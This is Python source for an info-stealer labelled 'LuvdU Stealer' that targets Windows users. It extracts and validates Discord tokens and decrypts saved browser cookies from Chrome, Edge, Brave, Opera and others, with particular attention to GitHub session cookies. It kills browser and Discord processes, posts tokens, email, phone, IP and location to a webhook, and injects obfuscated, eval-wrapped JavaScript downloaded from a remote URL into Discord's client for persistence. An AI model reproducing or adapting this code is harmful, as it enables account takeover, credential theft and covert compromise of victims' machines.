import base64
import json
import os
import random
import re
import sqlite3
import threading
from base64 import b64encode
from dataclasses import dataclass

import psutil as psutil
import requests
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

local = os.getenv("localappdata")
roaming = os.getenv("appdata")
webhook = open("webhook", "r").read()

base = """function decrypt(chain) {
    let script = chain
    let buff = Buffer.from(script, 'base64');
    let step1 = buff.toString('utf-8');
    var key = step1.slice(-2);
    var txt = step1.slice(0, -2);
    var gap = key.split('').reduce(function(acc, val) {
        return acc + val.charCodeAt(0);
    }, 0) % 26
    var src = "";
    for (var i = 0; i < txt.length; i++) {
        var c = txt[i];
        if (c.match(/[a-z]/i)) {
            var c_int = "";
            if (c === c.toLowerCase()) {
                c_int = String.fromCharCode((c.charCodeAt(0) - 97 - gap + 26) % 26 + 97);
            } else {
                c_int = String.fromCharCode((c.charCodeAt(0) - 65 - gap + 26) % 26 + 65);
            }
            src += c_int;
        } else {
            src += c;
        }
    }
    return src
}
eval(decrypt("%SCRIPT%"))
module.exports = require('./core.asar');"""


def hideJS(scr1pt):
    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    key = ''.join(random.sample(alpha, 2))
    gap = sum(ord(c) for c in key) % 26
    caeser = ''
    for c in scr1pt:
        if c.isalpha():
            if c.islower():
                cInt = chr((ord(c) - 97 + gap) % 26 + 97)
            else:
                cInt = chr((ord(c) - 65 + gap) % 26 + 65)
        else:
            cInt = c
        caeser += cInt
    obfStr = str(caeser + key)
    byte = obfStr.encode('UTF-8')
    text = b64encode(byte)
    js = base.replace('%SCRIPT%', text.decode('UTF-8'))
    return js


def getMasterKey(path: str):
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = f.read()
            f.close()
        local_state = json.loads(data)
        mKey = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        mKey = mKey[5:]
        mKey = CryptUnprotectData(mKey, None, None, None, 0)[1]
        return mKey
    except:
        pass


def decryptVal(buff: bytes, masterKey: bytes) -> str:
    cipher = AES.new(masterKey, AES.MODE_GCM, buff[3:15])
    return cipher.decrypt(buff[15:])[:-16].decode()


class LuvdU:
    def __init__(self):
        threads = []
        payloads = [Browser]

        for payload in payloads:
            thread = threading.Thread(target=payload)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()


class Injection:
    def __init__(self):
        self.discords = [
            f"{local}\\Discord"
        ]

        self.code = requests.get("https://raw.githubusercontent.com/XoQ2988/LuvdU/master/inject.js").text

        for proc in psutil.process_iter():
            if "discord" in proc.name().lower():
                proc.kill()

        for d in self.discords:
            if not os.path.exists(d):
                continue

            if self.getCore(d) is not None:
                with open(f"{self.getCore(d)[0]}\\index.js", "w", encoding="utf-8") as f:
                    f.write(hideJS(self.code.replace("%WEBHOOK%", webhook)))

    # noinspection PyAssignmentToLoopOrWithParameter
    @staticmethod
    def getCore(d: str) -> tuple:
        for f in os.listdir(d):
            if re.search(r'app-+?', f):
                modules = d + '\\' + f + '\\modules'
                if not os.path.exists(modules):
                    continue

                for f in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', f):
                        core = modules + '\\' + f + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue

                        return core, f


class Discord:
    def __init__(self):
        self.baseURL = "https://discord.com/api/v9/"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encReg = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens = []

        self.grabTokens()

        for token in self.tokens:
            self.sendToken(token)

    def tokenInfo(self, token: str) -> json:
        try:
            return requests.get(
                url=f"{self.baseURL}users/@me",
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                    "Content-Type": "application/json",
                    "Authorization": token
                }
            ).json()
        except:
            pass

    def sendToken(self, token: str) -> None:
        userData = self.tokenInfo(token)
        requests.post(
            url=webhook,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                "Content-Type": "application/json"
            },
            data=json.dumps({
                "content": "",
                "tts": False,
                "embeds": [
                    {
                        "id": 216117102,
                        "description": "",
                        "fields": [
                            {
                                "name": "Token:",
                                "value": f"```{token}```",
                            },
                            {
                                "name": "Email:",
                                "value": f"```{userData['email']}```",
                                "inline": True
                            },
                            {
                                "name": "Phone:",
                                "value": f"```{userData['phone']}```",
                                "inline": True
                            },
                        ],
                        "author": {
                            "name": f"{userData['global_name']} ({userData['id']})",
                            "icon_url": f"https://cdn.discordapp.com/avatars/{userData['id']}/{userData['avatar']}"
                        },
                        "color": userData["accent_color"]
                    }
                ],
                "components": [],
                "actions": {},
                "username": "LuvdU Stealer",
                "avatar_url": "https://i.imgur.com/444NM0M.jpg"
            })
        )

    def grabTokens(self):
        paths = {
            "Discord": f"{roaming}\\discord",
            "Opera GX": f"{roaming}\\Opera Software\\Opera GX Stable"
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue

            path = f"{path}\\Local Storage\\leveldb"
            disc = name.replace(" ", "").lower()

            for fName in os.listdir(path):
                if fName[-3:] not in ["log", "ldb"]:
                    continue

                for line in [x.strip() for x in open(f"{path}\\{fName}", errors="ignore").readlines() if x.strip()]:
                    if "cord" in path:
                        for token in re.findall(self.encReg, line):
                            if self._checkToken(token):
                                self.tokens.append(self._decryptToken(token, disc))
                    else:
                        for token in re.findall(self.regex, line):
                            if self._checkToken(token):
                                self.tokens.append(token)

    def _checkToken(self, token: str) -> bool:
        req = requests.get(
            url=f"{self.baseURL}users/@me",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                "Content-Type": "application/json",
                "Authorization": token
            }
        )
        if req.status_code == 200:
            return token not in self.tokens

        return False

    @staticmethod
    def _decryptToken(token: str, disc: str) -> str:
        return decryptVal(
            base64.b64decode(token.split("dQw4w9WgXcQ:")[1]),
            getMasterKey(f"{roaming}\\{disc}\\Local State")
        )


class Info:
    def __init__(self):
        self.networkInfo = None

        self.sendInfo()

    @staticmethod
    def sendInfo() -> None:
        data = requests.get(f"http://ip-api.com/json").json()
        requests.post(
            url=webhook,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                "Content-Type": "application/json"
            },
            data=json.dumps({
                "content": f":flag_{data['countryCode'].lower()}: `{os.getlogin()} {data['query']} [{data['city']}/{data['country']}]`",
                "tts": False,
                "components": [],
                "username": "LuvdU Stealer",
                "avatar_url": "https://i.imgur.com/444NM0M.jpg"
            })
        )


class Browser:
    def __init__(self):
        # List of .exe to kill
        exes = ["edge.exe", "brave.exe", "yandex.exe", "chrome.exe", "opera.exe"]
        toKill = []

        # List of browsers and their path
        browsers = {
            "Microsoft Edge": f"{local}\\Microsoft\\Edge",
            "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
            "Yandex": f"{local}\\Yandex",
            "Google Chrome": f"{local}\\Google\\Chrome",
            "Google Chrome Canary": f"{local}\\Google SxS\\Chrome",
            "Opera": f"{roaming}\\Opera Software\\Opera Stable",
            "Opera GX": f"{roaming}\\Opera Software\\Opera GX Stable",
            "Opera Neon": f"{roaming}\\Opera Software\\Opera Stable"
        }

        # Generate list of profiles to check for data
        profiles = ["Default"] + [x for x in [f"Profile {x + 1}" for x in range(5)]]

        self.cookies = []
        self.sessions = []

        # Try to kill running processes to close files
        for proc in psutil.process_iter(["name"]):
            procName = proc.name().lower()
            if procName in exes:
                toKill.append(proc)

        for proc in toKill:
            try:
                proc.kill()
            except:
                pass

        for name, path in browsers.items():
            if not os.path.exists(path):
                continue

            if "opera" not in name.lower():
                path = f"{path}\\User Data"

            self.mKey = getMasterKey(f"{path}\\Local State")

            if not self.mKey:
                continue

            for profile in profiles:
                if not os.path.exists(f"{path}\\{profile}"):
                    continue
                self.getCookies(path, profile)

        self.getSessions()
        print(self.sessions)

    def getCookies(self, path: str, profile: str) -> None:
        cookieDB = f"{path}\\{profile}\\Network\\Cookies"

        if not os.path.exists(cookieDB):
            return

        conn = sqlite3.connect(cookieDB)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")

        for row in cursor.fetchall():
            cookie = decryptVal(row[3], self.mKey)
            self.cookies.append(Cookie(row[0], row[1], row[2], cookie, row[4]))

    def getSessions(self) -> None:
        sessionCookies = {
            "github.com": "user_session"
        }
        for cookie in self.cookies:
            for host, name in sessionCookies.items():
                if cookie.host in host and cookie.name == name:
                    self.sessions.append(cookie)


@dataclass
class Cookie:
    host: str
    name: str
    path: str
    value: str
    expires: str


if __name__ == "__main__":
    LuvdU()
